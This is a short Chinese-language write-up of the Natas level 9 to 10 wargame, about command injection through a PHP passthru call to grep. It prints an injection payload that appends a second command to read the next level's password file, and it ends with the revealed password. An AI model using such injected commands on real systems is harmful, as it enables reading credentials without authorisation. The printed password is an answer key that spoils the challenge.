# Natas Level 9 → 10

## 目標
搜尋框的輸入直接拼進 shell 指令，利用 Command Injection 讀取密碼。

## 解題過程

原始碼顯示：
```php
passthru("grep -i $key dictionary.txt");
```

`$key` 未過濾直接拼進指令。在搜尋框輸入：
```
; cat /etc/natas_webpass/natas10
```

實際執行的指令變成：
```bash
grep -i ; cat /etc/natas_webpass/natas10 dictionary.txt
```

`;` 分隔兩個指令，第二個指令讀出密碼。

## 關鍵概念

- **Command Injection**：用戶輸入未過濾直接拼進 shell 指令
- `;` 在 shell 中是指令分隔符，可執行任意額外指令
- OWASP Top 10 最危險漏洞之一
- 應使用 `escapeshellarg()` 或避免直接呼叫 shell

## 密碼
`t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`
